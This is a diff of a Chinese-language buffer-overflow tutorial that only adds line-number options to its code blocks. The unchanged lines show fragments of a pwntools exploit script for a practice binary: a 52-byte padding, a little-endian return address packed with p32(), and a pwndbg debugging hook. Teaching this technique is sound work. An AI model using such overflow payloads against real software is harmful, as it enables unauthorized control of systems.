@@ -61,7 +61,7 @@ $ i fun
 
 这比你想象的要简单得多，因为我们可以在 Python 中将它们指定为十六进制。
 
-```python
+```python showLineNumbers
 address = '\x08\x04\x91\xc3'
 ```
 
@@ -81,7 +81,7 @@ address = '\x08\x04\x91\xc3'
 
 现在我们知道了溢出 Padding 和想要覆盖的值，我们可以使用 [pwntools](https://github.com/Gallopsled/pwntools) 与二进制文件交互，编写漏洞利用脚本。
 
-```python:exp.py
+```python:exp.py showLineNumbers
 from pwn import *
 
 context(os='linux', arch='amd64', log_level='debug')
@@ -100,7 +100,7 @@ p.interactive()
 
 如果你直接运行上面的脚本，就会发现一个小问题：它没有输出 `Exploited`。为什么？我们可以用调试器来检查一下。添加 hook `pwndbg` 的代码，以及 `pause()`，以便我们可以在想发送 `payload` 的时候发送 `payload` 。
 
-```python:exp.py
+```python:exp.py showLineNumbers
 from pwn import *
 
 context(os='linux', arch='amd64', log_level='debug')
@@ -156,7 +156,7 @@ Arch:     i386-32-little
 
 解决方法很简单：反转字节序
 
-```python
+```python showLineNumbers
 payload += '\x08\x04\x91\xc3'[::-1]
 ```
 
@@ -180,19 +180,19 @@ Exploited!!!!!
 
 毫不奇怪，你并不是第一个想到「能否使字节顺序书写变得更简单」的人。幸运的是，`pwntools` 有一个内置的 `p32()` 函数可供使用！
 
-```python
+```python showLineNumbers
 payload += '\x08\x04\x91\xc3'[::-1]
 ```
 
 改为：
 
-```python
+```python showLineNumbers
 payload += p32(0x080491c3)
 ```
 
 这样就简单多了。唯一需要注意的是它返回字节而不是字符串，因此你必须将溢出 Padding 设置为字节字符串：
 
-```python
+```python showLineNumbers
 payload = b'A' * 52  # 注意 "b"
 ```
 
@@ -204,7 +204,7 @@ TypeError: can only concatenate str (not "bytes") to str
 
 ## 0x08 最终的 Exploit 脚本
 
-```python:exp.py
+```python:exp.py showLineNumbers
 from pwn import *
 
 context(os='linux', arch='amd64', log_level='debug')
